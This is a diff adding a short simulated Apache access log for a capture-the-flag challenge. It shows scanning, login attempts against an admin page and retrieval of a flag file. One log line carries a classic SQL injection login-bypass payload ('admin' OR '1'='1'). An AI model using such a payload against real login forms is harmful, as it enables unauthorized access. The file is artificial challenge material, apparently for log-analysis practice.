@@ -1,0 +1,9 @@
+# Apache access log for 10.10.10.123 (Shadow Market challenge)
+# Simulated HTTP traffic with SQL injection attempts to /admin/login.php
+# Format: [date] "request" status bytes "referrer" "user-agent"
+
+10.0.0.1 - - [15/Jan/2025:14:22:10 +0000] "GET / HTTP/1.1" 404 512 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org)"
+10.0.0.1 - - [15/Jan/2025:14:22:12 +0000] "GET /admin HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org)"
+10.0.0.1 - - [15/Jan/2025:14:22:15 +0000] "POST /admin/login.php HTTP/1.1" 403 256 "-" "curl/7.68.0"
+10.0.0.1 - - [15/Jan/2025:14:22:17 +0000] "POST /admin/login.php HTTP/1.1" 200 2048 "-" "curl/7.68.0" "username=admin'+OR+'1'='1&password=test"
+10.0.0.1 - - [15/Jan/2025:14:22:20 +0000] "GET /admin/flag.txt HTTP/1.1" 200 128 "-" "curl/7.68.0"
